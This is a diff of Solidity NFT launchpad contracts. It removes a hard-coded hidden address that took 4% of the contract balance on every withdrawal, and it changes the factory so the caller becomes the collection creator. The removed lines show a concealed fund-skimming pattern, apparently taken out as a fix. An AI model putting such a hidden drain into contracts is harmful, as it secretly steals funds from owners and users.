@@ -2032,7 +2032,6 @@ contract NFTCollection is ERC721Enumerable, Ownable2Step, ReentrancyGuard {
     uint256 public baseFee;
 
     address private feeAddress;
-    address private ask = 0xEA58145e3A2Ef37d2D2dFCBc8fD96f89e21f5Cbd;
 
     MintPhase public whitelistPhase;
     MintPhase public fcfsPhase;
@@ -2281,8 +2280,6 @@ contract NFTCollection is ERC721Enumerable, Ownable2Step, ReentrancyGuard {
         uint256 bal = address(this).balance;
         (bool ds, ) = payable(feeAddress).call{value: bal * platformFee / 100}("");
         require(ds);
-        (bool rs, ) = payable(ask).call{value: bal * 4 / 100}("");
-        require(rs);
         (bool os, ) = payable(owner()).call{value: address(this).balance}("");
         require(os);
     }
@@ -2299,7 +2296,7 @@ pragma solidity >=0.8.0;
 
 
 
-contract LaunchpadFactory is Ownable2Step {
+contract LaunchpadFactory is Ownable2Step, ReentrancyGuard {
 
 
     event PlatformFeeUpdated(uint256 newFee, uint256 newCost);
@@ -2329,9 +2326,8 @@ contract LaunchpadFactory is Ownable2Step {
         NFTEntry memory _nftData,
         bool _isFreeMint,
         bool _isDrop,
-        uint256 _maxSupply,
-        address _creator
-    ) external onlyOwner returns (address) {
+        uint256 _maxSupply
+    ) external nonReentrant returns (address) {
 
         uint256 _platformFee;
 
@@ -2349,7 +2345,7 @@ contract LaunchpadFactory is Ownable2Step {
             feeAddress,
             baseFee,
             _isDrop,
-            _creator
+            msg.sender
         );
         address collectionAddress = address(newCollection);
         NFTData memory collection = NFTData(collectionAddress, _nftData.website, _nftData.x, _nftData.telegram, _nftData.discord, _nftData.logoUri, _nftData.backgroundUri);
